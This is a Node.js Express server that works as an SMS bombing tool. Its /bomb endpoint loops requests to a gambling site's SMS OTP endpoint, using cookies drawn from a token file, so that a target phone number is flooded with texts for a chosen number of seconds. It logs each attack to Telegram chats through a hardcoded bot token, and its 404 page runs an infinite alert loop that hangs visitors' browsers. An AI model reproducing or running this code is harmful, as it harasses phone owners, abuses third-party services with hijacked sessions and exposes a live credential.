const path = require("path");
const express = require("express");
const app = express();
const axios = require("axios");
const fs = require("fs");
const { rateLimit } = require("express-rate-limit");

app.use((req, res, next) => {
  res.set({
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, HEAD, POST, PUT, DELETE, PATCH, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, X-Requested-With, Accept",
    "Cache-Control": "no-cache, no-store"
  });
  if (req.method === "OPTIONS") {
    res.sendStatus(200);
  } else {
    next();
  }
});

app.use(express.json());
app.set("json spaces", 4);
app.enable("trust proxy");

const limiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  limit: 100, // limit to 100 requests per windowMs
  standardHeaders: 'draft-8',
  legacyHeaders: false,
  validate: {
    trustProxy: false
  },
  async handler(req, res, next, options) {
    res.json({
      error: "Too many requests, try again later."
    });
  }
});

app.use(limiter);
app.use(express.static(path.join(__dirname, "public")));

const author = "Developerneth";
const routes = [
  {
    path: "/",
    file: "index.html"
  }
];

routes.forEach(route => {
  app.get(route.path, (req, res) => {
    res.sendFile(path.join(__dirname, "public", route.file));
  });
});

const numberspamed = {};

const delay = async ms => await new Promise(r => setTimeout(r, ms));

const headers = {
  'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  'Accept': 'application/json, text/plain, */*',
  'Accept-Encoding': 'gzip, deflate, br, zstd',
  'Content-Type': 'application/json',
  'deviceid': '',
  'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
  'version': '',
  'accept-language': 'en-US',
  'versioncode': '',
  'sec-ch-ua-mobile': '?1',
  'requestfrom': 'H5',
  'sec-ch-ua-platform': '"Android"',
  'origin': 'https://slotmax.vip',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-mode': 'cors',
  'sec-fetch-dest': 'empty',
  'priority': 'u=1, i'
};

const file = JSON.parse(fs.readFileSync("eytokens.json", "utf-8"));

async function smsotp(phone) {
  try {
    const cookie = file[Math.floor(Math.random() * file.length)];
    let config = {
      method: 'POST',
      url: 'https://slotmax.vip/api/user/sms/send/bind',
      headers: {
        ...headers,
        cookie,
        'referer': 'https://slotmax.vip/wallet'
      },
      data: {
        phone,
        "areaCode": "63"
      }
    };

    const { data } = await axios.request(config);
  } catch (error) {
    console.error(error.message || error);
  }
}

async function sendTelegramMessage(message, chatIds) {
  const botToken = '7625008223:AAGFBGRJ_VlESP7GMP3qFGD1Wu-RE4IY_eE';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  for (let chatId of chatIds) {
    const params = new URLSearchParams();
    params.append('chat_id', chatId);
    params.append('text', message);

    try {
      await axios.post(url, params, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
    } catch (error) {
      console.error("Error sending message to Telegram: ", error);
    }
  }
}

app.get("/bomb", async (req, res) => {
  const { number, seconds } = req.query;
  try {
    if (!(number && !isNaN(seconds)) || !seconds) throw new Error("Please enter number and second limit.");
    if (seconds > 240) throw new Error("Seconds must be limited to 240 seconds to prevent abuse.");
    if (numberspamed.hasOwnProperty(number) && numberspamed[number]) throw new Error("Don't spam! 😀");

    let exceeded = false;
    delay(parseInt(seconds) * 1000).then(() => {
      exceeded = true;
    });

    res.json({
      message: "Kaboom success",
      number,
      seconds: `${seconds} seconds`
    });

    numberspamed[number] = true;

    const message = `𝗨𝗦𝗘𝗥 𝗨𝗣𝗗𝗔𝗧𝗘𝗦 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞\n\n\nNumber: ${number}\nSeconds: ${seconds}`;
    const chatIds = ['8193991666', '-1002570468130'];
    await sendTelegramMessage(message, chatIds);

    while (true) {
      await smsotp(number.slice(1));
      if (exceeded) {
        numberspamed[number] = false;
        delete numberspamed[number];
        break;
      }
    }
  } catch (error) {
    return res.json({
      error: error.message || error,
      author
    });
  }
});

app.get("*", (req, res) => res.send("<script>while(true){alert('Page not found')}</script>"));

app.listen(3000, () => {
  console.log(`Running`);
});

process.on("unhandledRejection", reason => {
  console.log(`Error: ${reason}`);
});
